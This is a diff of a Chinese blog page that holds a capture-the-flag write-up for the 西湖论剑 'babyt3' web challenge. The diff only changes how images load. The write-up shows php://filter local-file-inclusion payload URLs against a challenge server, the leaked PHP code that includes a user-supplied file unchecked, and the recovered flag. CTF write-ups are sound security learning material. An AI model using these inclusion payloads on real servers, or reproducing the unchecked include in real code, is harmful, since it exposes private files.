@@ -140,15 +140,15 @@
     <h1>西湖论剑web 3题 解析</h1>
     <p>西湖论剑的题目 前些天没有做 今天西湖论剑的题目重新放了出来 可以复现了</p>
 <p>故来做一下web题目 题目质量较高</p>
-<p><img alt="Xnip2019-04-11_16-54-10.jpg" data-src="https://i.loli.net/2019/04/11/5caf00c571680.jpg" class="lazyload"></p>
+<p><img src="https://i.loli.net/2019/04/11/5caf00c571680.jpg" alt="Xnip2019-04-11_16-54-10.jpg"></p>
 <a id="more"></a>
-<h2 id="babyt3"><a href="#babyt3" class="headerlink" title="babyt3"></a>babyt3</h2><p><img alt="Xnip2019-04-11_16-55-57.jpg" data-src="https://i.loli.net/2019/04/11/5caf012737d97.jpg" class="lazyload"></p>
+<h2 id="babyt3"><a href="#babyt3" class="headerlink" title="babyt3"></a>babyt3</h2><p><img src="https://i.loli.net/2019/04/11/5caf012737d97.jpg" alt="Xnip2019-04-11_16-55-57.jpg"></p>
 <p>打开题目连接 看到一个类似博客界面 都不是重点 重点是看到了</p>
 <p><code>include $_GET[&#39;file&#39;]</code></p>
 <p>看到这突然想到题目考查的应该是文件包含相关知识</p>
 <p>故试一下</p>
 <figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">http</span>://<span class="number">61.164</span><span class="number">.47</span><span class="number">.198</span>:<span class="number">10000</span>/?<span class="built_in">file</span>=php://<span class="built_in">filter</span>/<span class="built_in">convert</span>.base64-encode/resource=index.php</span><br></pre></td></tr></table></figure>
-<p><img alt="Xnip2019-04-11_17-01-08.jpg" data-src="https://i.loli.net/2019/04/11/5caf025fce103.jpg" class="lazyload"></p>
+<p><img src="https://i.loli.net/2019/04/11/5caf025fce103.jpg" alt="Xnip2019-04-11_17-01-08.jpg"></p>
 <p>两端base64加密的内容 第一段为index.php加密后的内容</p>
 <p>base解密后为</p>
 <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$a = @$_GET[<span class="string">'file'</span>];</span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (!$a) &#123;</span></span><br><span class="line"><span class="php">	$a = <span class="string">'./templates/index.html'</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">'include $_GET[\'file\']'</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (strpos(<span class="string">'flag'</span>,$a)!==<span class="keyword">false</span>) &#123;</span></span><br><span class="line"><span class="php">	<span class="keyword">die</span>(<span class="string">'nonono'</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">include</span> $a;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--hint: ZGlyLnBocA== --&gt;</span></span><br></pre></td></tr></table></figure>
@@ -156,7 +156,7 @@
 <p>解密后为<code>dir.php</code></p>
 <p>访问一下</p>
 <figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span><span class="comment">//61.164.47.198:10000/dir.php</span></span><br></pre></td></tr></table></figure>
-<p><img alt="Xnip2019-04-11_17-06-33.jpg" data-src="https://i.loli.net/2019/04/11/5caf03a35ecf1.jpg" class="lazyload"></p>
+<p><img src="https://i.loli.net/2019/04/11/5caf03a35ecf1.jpg" alt="Xnip2019-04-11_17-06-33.jpg"></p>
 <p>接下来利用文件包含 包含<code>dir.php</code>这个文件。</p>
 <figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">http</span>://<span class="number">61.164</span><span class="number">.47</span><span class="number">.198</span>:<span class="number">10000</span>/?<span class="built_in">file</span>=php://<span class="built_in">filter</span>/<span class="built_in">convert</span>.base64-encode/resource=dir.php</span><br></pre></td></tr></table></figure>
 <p>base64解密后得到 <code>dir.php</code>源码</p>
@@ -165,9 +165,9 @@
 <p>自己想的是 如果我输入某目录 就会展示出目录下所有文件 文件夹名 之后我是不是可以利用文件包含 读取任意文件的内容呢？？</p>
 <p>经过测试 发现<code>ffffflag_is_Her4</code>文件</p>
 <p>估计flag在文件内</p>
-<p><img alt="Xnip2019-04-11_17-18-01.jpg" data-src="https://i.loli.net/2019/04/11/5caf2a25e9eb1.jpg" class="lazyload"></p>
+<p><img src="https://i.loli.net/2019/04/11/5caf2a25e9eb1.jpg" alt="Xnip2019-04-11_17-18-01.jpg"></p>
 <p>利用文件包含读取内容</p>
-<p><img alt="Xnip2019-04-11_17-20-24.jpg" data-src="https://i.loli.net/2019/04/11/5caf2b5ea7cc7.jpg" class="lazyload"></p>
+<p><img src="https://i.loli.net/2019/04/11/5caf2b5ea7cc7.jpg" alt="Xnip2019-04-11_17-20-24.jpg"></p>
 <p>果然发现flag</p>
 <figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml">flag</span><span class="template-variable">&#123;8dc25fd21c52958f777ce92409e2802a&#125;</span><span class="xml"></span></span><br></pre></td></tr></table></figure>
 
